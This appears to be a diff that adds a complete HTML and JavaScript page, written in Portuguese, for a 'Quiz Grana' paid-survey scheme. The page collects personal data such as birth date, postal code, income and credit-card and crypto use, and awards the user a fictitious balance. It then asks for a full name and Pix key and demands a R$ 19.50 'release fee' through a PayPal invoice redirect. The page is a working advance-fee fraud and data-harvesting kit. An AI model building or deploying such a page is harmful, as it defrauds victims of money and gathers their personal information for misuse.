@@ -1,0 +1,214 @@
+<!DOCTYPE html><html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quiz Grana</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
+      padding: 20px;
+      text-align: center;
+    }
+    .quiz-container {
+      max-width: 500px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .hidden {
+      display: none;
+    }
+    .saldo {
+      font-size: 1.2em;
+      margin-bottom: 10px;
+      color: green;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 10px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin: 10px 0;
+    }
+    .taxa {
+      font-size: 0.9em;
+      color: red;
+      margin-bottom: 10px;
+    }
+    .aviso {
+      background: #fff8e1;
+      border: 1px solid #ffd54f;
+      padding: 10px;
+      margin-top: 20px;
+      font-size: 0.95em;
+    }
+    #erroIdade {
+      background: #ffcdd2;
+      color: #b71c1c;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 5px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="quiz-container">
+    <div id="inicio">
+      <h1>Bem-vindo ao Quiz Grana!</h1>
+      <div class="saldo">Saldo: R$ <span id="saldo">0,00</span></div>
+      <button onclick="iniciarQuiz()">Iniciar Pesquisa</button>
+    </div><form id="quiz" class="hidden">
+  <div class="saldo">Saldo: R$ <span id="saldoQuiz">0,00</span></div>
+  <div id="perguntas"></div>
+  <div id="erroIdade">Você precisa ter pelo menos 16 anos para participar do quiz.</div>
+  <button type="submit" id="finalizarBtn">Finalizar Pesquisa</button>
+</form>
+
+<div id="final" class="hidden">
+  <h2>Parabéns!</h2>
+  <p>Você ganhou R$ <span id="ganhoTotal"></span></p>
+  <button onclick="mostrarSaque()">Sacar Agora</button>
+</div>
+
+<div id="saque" class="hidden">
+  <h2>Solicitação de Saque</h2>
+  <p>Informe seus dados para receber o valor:</p>
+  <form onsubmit="enviarSaque(event)">
+    <input type="text" id="nome" placeholder="Seu nome completo" required>
+    <input type="text" id="pix" placeholder="Chave Pix (CPF, e-mail ou telefone)" required>
+    <input type="text" id="valor" readonly>
+    <div class="taxa">⚠️ Para concluir o saque, é necessário pagar uma taxa de R$ 19,50 para verificação e liberação manual.</div>
+    <p>Você será redirecionado para efetuar o pagamento.</p>
+    <button type="submit">Confirmar Solicitação</button>
+  </form>
+  <div id="mensagemSaque" style="margin-top:10px; color:green;"></div>
+  <div class="aviso">
+    <strong>Importante:</strong> O valor será transferido em até 24h após confirmação do pagamento da taxa. Essa taxa cobre custos operacionais da plataforma. Você pode solicitar reembolso caso não receba.
+  </div>
+</div>
+
+  </div>  <script>
+    const perguntas = [
+      { pergunta: "Data de nascimento:", tipo: "input", inputType: "date", valor: 20 },
+      { pergunta: "CEP:", tipo: "input", inputType: "text", valor: 20 },
+      { pergunta: "Estado Civil:", tipo: "select", opcoes: ["Solteiro(a)", "Casado(a)", "Divorciado(a)"], valor: 60 },
+      { pergunta: "Você possui filhos?", tipo: "select", opcoes: ["Sim", "Não"], valor: 60 },
+      { pergunta: "Está empregado atualmente?", tipo: "select", opcoes: ["Sim", "Não"], valor: 20 },
+      { pergunta: "Qual sua renda mensal?", tipo: "select", opcoes: ["Menos de R$2.000", "Entre R$2.000 e R$5.000", "Mais de R$5.000"], valor: 60 },
+      { pergunta: "Você possui cartão de crédito?", tipo: "select", opcoes: ["Sim", "Não"], valor: 20 },
+      { pergunta: "Você tem conta em banco digital?", tipo: "select", opcoes: ["Sim", "Não"], valor: 20 },
+      { pergunta: "Você costuma fazer compras online?", tipo: "select", opcoes: ["Sim", "Não"], valor: 20 },
+      { pergunta: "Você já investiu em criptomoedas?", tipo: "select", opcoes: ["Sim", "Não"], valor: 60 }
+    ];
+
+    let saldo = 0;
+    let menorDe16 = false;
+
+    function atualizarSaldo() {
+      document.getElementById('saldo').innerText = saldo.toFixed(2);
+      document.getElementById('saldoQuiz').innerText = saldo.toFixed(2);
+    }
+
+    function iniciarQuiz() {
+      document.getElementById('inicio').classList.add('hidden');
+      const form = document.getElementById('quiz');
+      const container = document.getElementById('perguntas');
+
+      perguntas.forEach((item, index) => {
+        const div = document.createElement('div');
+        const id = `q${index}`;
+        let campo = '';
+
+        if (item.tipo === "input") {
+          campo = `<input type="${item.inputType}" id="${id}" data-valor="${item.valor}" required>`;
+        } else if (item.tipo === "select") {
+          const opcoesHtml = item.opcoes.map(op => `<option value="${op}">${op}</option>`).join('');
+          campo = `<select id="${id}" data-valor="${item.valor}" required><option value="">Selecione</option>${opcoesHtml}</select>`;
+        }
+
+        div.innerHTML = `<label for="${id}">${item.pergunta}</label>${campo}`;
+        container.appendChild(div);
+      });
+
+      container.querySelectorAll('input, select').forEach(el => {
+        el.addEventListener('input', () => {
+          let total = 0;
+          menorDe16 = false;
+          document.getElementById('erroIdade').style.display = 'none';
+
+          container.querySelectorAll('input, select').forEach(input => {
+            const valor = parseInt(input.dataset.valor);
+            if (input.value !== '') {
+              if (input.type === 'date') {
+                const hoje = new Date();
+                const nascimento = new Date(input.value);
+                let idade = hoje.getFullYear() - nascimento.getFullYear();
+                const m = hoje.getMonth() - nascimento.getMonth();
+                if (m < 0 || (m === 0 && hoje.getDate() < nascimento.getDate())) {
+                  idade--;
+                }
+                if (idade < 16) {
+                  menorDe16 = true;
+                } else {
+                  total += valor;
+                }
+              } else {
+                total += valor;
+              }
+            }
+          });
+
+          if (menorDe16) {
+            document.getElementById('erroIdade').style.display = 'block';
+            document.getElementById('finalizarBtn').disabled = true;
+            saldo = 0;
+          } else {
+            document.getElementById('erroIdade').style.display = 'none';
+            document.getElementById('finalizarBtn').disabled = false;
+            saldo = total;
+          }
+
+          atualizarSaldo();
+        });
+      });
+
+      form.classList.remove('hidden');
+    }
+
+    function mostrarSaque() {
+      document.getElementById('final').classList.add('hidden');
+      document.getElementById('saque').classList.remove('hidden');
+      document.getElementById('valor').value = `R$ ${saldo.toFixed(2)}`;
+    }
+
+    function enviarSaque(e) {
+      e.preventDefault();
+      const nome = document.getElementById('nome').value;
+      const pix = document.getElementById('pix').value;
+      const valor = document.getElementById('valor').value;
+
+      if (nome && pix) {
+        document.getElementById('mensagemSaque').innerText = `Redirecionando para pagamento da taxa...`;
+        setTimeout(() => {
+          window.location.href = "https://www.paypal.com/invoice/p/#INV2-CCB7-2ZHA-E7J7-5QRN";
+        }, 1500);
+      }
+    }
+
+    document.getElementById('quiz').addEventListener('submit', function(e) {
+      e.preventDefault();
+      if (menorDe16) return;
+      document.getElementById('quiz').classList.add('hidden');
+      document.getElementById('final').classList.remove('hidden');
+      document.getElementById('ganhoTotal').innerText = saldo.toFixed(2);
+    });
+  </script></body>
+</html>
